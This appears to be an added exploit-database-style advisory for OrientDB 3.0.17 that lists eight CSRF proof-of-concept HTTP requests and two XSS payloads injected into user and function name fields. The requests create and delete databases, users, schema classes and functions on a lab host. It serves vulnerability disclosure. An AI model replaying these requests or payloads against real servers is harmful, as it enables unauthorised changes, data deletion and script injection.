@@ -1,0 +1,268 @@
+##################################################################################################################################
+# Exploit Title: OrientDB 3.0.17 GA Community Edition (March 7th, 2019) | Multiple Vulnerabilities
+# Date: 07.03.2019
+# Exploit Author: Ozer Goker
+# Vendor Homepage: https://orientdb.org
+# Software Link: https://orientdb.org/download
+# Version: 3.0.17 GA Community Edition (March 7th, 2019)
+##################################################################################################################################
+
+Introduction
+
+OrientDB is the world’s fastest graph database. Period. An independent
+benchmark study by IBM and the Tokyo Institute of Technology showed that
+OrientDB is 10x faster than Neo4j on graph operations among all the
+workloads. Drive competitive advantage and accelerate innovation with new
+revenue streams.
+
+#################################################################################
+
+Vulnerabilities: CSRF | XSS Reflected & Stored
+
+#################################################################################
+
+CSRF details:
+
+#################################################################################
+
+CSRF1
+
+Create Database
+
+POST /database/testdb/plocal/graph HTTP/1.1
+Host: 192.168.2.101:2480
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:65.0)
+Gecko/20100101 Firefox/65.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.2.101:2480/studio/index.html
+Authorization: Basic cm9vdDpyb290
+X-Requested-With: XMLHttpRequest
+Content-Type: application/json;charset=utf-8
+DNT: 1
+Connection: close
+Cookie: CockpitLang=en-us; OSESSIONID=-
+Content-Length: 0
+
+#################################################################################
+
+CSRF2
+
+Delete Database
+
+DELETE /database/testdb HTTP/1.1
+Host: 192.168.2.101:2480
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:65.0)
+Gecko/20100101 Firefox/65.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.2.101:2480/studio/index.html
+Authorization: Basic cm9vdDpyb290
+X-Requested-With: XMLHttpRequest
+DNT: 1
+Connection: close
+Cookie: CockpitLang=en-us; OSESSIONID=-
+
+#################################################################################
+
+CSRF3
+
+Schema Manage New Vertex
+
+POST /command/demodb/sql/-/20?format=rid,type,version,class,graph HTTP/1.1
+Host: 192.168.2.101:2480
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:65.0)
+Gecko/20100101 Firefox/65.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.2.101:2480/studio/index.html
+content-type: text/plain
+X-Requested-With: XMLHttpRequest
+Content-Length: 33
+DNT: 1
+Connection: close
+Cookie: CockpitLang=en-us; OSESSIONID=OS1551978095783-8372032249854396825
+
+CREATE CLASS `test`  extends  `V`
+
+#################################################################################
+
+CSRF4
+
+Schema Manage Delete Vertex
+
+POST /command/demodb/sql/-/20?format=rid,type,version,class,graph HTTP/1.1
+Host: 192.168.2.101:2480
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:65.0)
+Gecko/20100101 Firefox/65.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.2.101:2480/studio/index.html
+content-type: text/plain
+X-Requested-With: XMLHttpRequest
+Content-Length: 17
+DNT: 1
+Connection: close
+Cookie: CockpitLang=en-us; OSESSIONID=OS1551978095783-8372032249854396825
+
+DROP CLASS `test`
+
+#################################################################################
+
+CSRF5
+
+Add User
+
+POST /document/demodb/-1:-1 HTTP/1.1
+Host: 192.168.2.101:2480
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:65.0)
+Gecko/20100101 Firefox/65.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.2.101:2480/studio/index.html
+X-Requested-With: XMLHttpRequest
+Content-Type: application/json;charset=utf-8
+Content-Length: 108
+DNT: 1
+Connection: close
+Cookie: CockpitLang=en-us; OSESSIONID=OS1551978095783-8372032249854396825
+
+{"@class":"OUser","@version":0,"@rid":"#-1:-1","name":"test","password":"test","roles":[],"status":"ACTIVE"}
+
+#################################################################################
+
+CSRF6
+
+Delete User
+
+DELETE /document/demodb/5:3 HTTP/1.1
+Host: 192.168.2.101:2480
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:65.0)
+Gecko/20100101 Firefox/65.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.2.101:2480/studio/index.html
+X-Requested-With: XMLHttpRequest
+DNT: 1
+Connection: close
+Cookie: CockpitLang=en-us; OSESSIONID=OS1551978095783-8372032249854396825
+
+
+#################################################################################
+
+CSRF7
+
+Functions Management New
+
+POST /document/demodb/-1:-1 HTTP/1.1
+Host: 192.168.2.101:2480
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:65.0)
+Gecko/20100101 Firefox/65.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.2.101:2480/studio/index.html
+X-Requested-With: XMLHttpRequest
+Content-Type: application/json;charset=utf-8
+Content-Length: 141
+DNT: 1
+Connection: close
+Cookie: CockpitLang=en-us; OSESSIONID=OS1551978095783-8372032249854396825
+
+{"@class":"ofunction","@version":0,"@rid":"#-1:-1","idempotent":null,"name":"test","language":"javascript","code":null,"parameters":["test"]}
+
+#################################################################################
+
+CSRF8
+
+Functions Management Delete
+
+DELETE /document/demodb/6:5 HTTP/1.1
+Host: 192.168.2.101:2480
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:65.0)
+Gecko/20100101 Firefox/65.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.2.101:2480/studio/index.html
+X-Requested-With: XMLHttpRequest
+DNT: 1
+Connection: close
+Cookie: CockpitLang=en-us; OSESSIONID=OS1551978095783-8372032249854396825
+
+
+#################################################################################
+
+XSS details:
+
+#################################################################################
+
+XSS1 Stored
+
+Add User
+
+POST /document/demodb/-1:-1 HTTP/1.1
+Host: 192.168.2.101:2480
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:65.0)
+Gecko/20100101 Firefox/65.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.2.101:2480/studio/index.html
+X-Requested-With: XMLHttpRequest
+Content-Type: application/json;charset=utf-8
+Content-Length: 133
+DNT: 1
+Connection: close
+Cookie: CockpitLang=en-us; OSESSIONID=OS1551978095783-8372032249854396825
+
+{"@class":"OUser","@version":0,"@rid":"#-1:-1","name":"test<script>alert(1)</script>","password":"test","roles":[],"status":"ACTIVE"}
+
+PoC
+
+XSS works on Security Manager Actions - Delete
+
+#################################################################################
+
+XSS2 Reflected
+
+URL
+http://192.168.2.101:2480/document/demodb/-1:-1
+
+METHOD
+Post
+
+PARAMETER
+name
+
+PAYLOAD
+<script>alert(2)</script>
+
+POST /document/demodb/-1:-1 HTTP/1.1
+Host: 192.168.2.101:2480
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:65.0)
+Gecko/20100101 Firefox/65.0
+Accept: application/json, text/plain, */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.2.101:2480/studio/index.html
+X-Requested-With: XMLHttpRequest
+Content-Type: application/json;charset=utf-8
+Content-Length: 162
+DNT: 1
+Connection: close
+Cookie: CockpitLang=en-us; OSESSIONID=OS1551978095783-8372032249854396825
+
+{"@class":"ofunction","@version":0,"@rid":"#-1:-1","idempotent":null,"name":"test<script>alert(2)</script>","language":"javascript","code":null,"parameters":null}
+
+PoC
+
+XSS works on Functions Management - Save
+
+#################################################################################
